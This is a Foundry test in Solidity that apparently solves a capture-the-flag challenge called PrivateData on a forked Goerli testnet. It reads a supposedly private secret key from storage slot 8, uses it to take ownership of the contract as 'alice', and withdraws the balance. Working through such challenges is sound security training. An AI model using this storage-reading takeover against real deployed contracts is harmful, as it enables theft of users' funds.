// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.19;

import "../src/PrivateData/PrivateData.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract PrivateDataTest is Test {
    address alice;
    address contractAddress = 0x620E0c88E0f8F36bCC06736138bDEd99B6401192;

    function setUp() public {
        string memory RPC = vm.envString("GOERLI_RPC_URL");
        vm.createSelectFork(RPC, 7156811);
        alice = makeAddr("alice");
    }

    function testTakeOwnership() public {
        PrivateData privateData = PrivateData(payable(contractAddress));
        assertEq(privateData.owner() == alice, false);
        console.log(privateData.owner());

        bytes32 secretKeyBytes = vm.load(address(privateData), bytes32(uint256(8)));

        uint256 secretKey = uint256(secretKeyBytes);
        vm.startPrank(alice);
        privateData.takeOwnership(secretKey);
        assertEq(privateData.owner(), alice);
        privateData.withdraw();
        vm.stopPrank();
    }
}
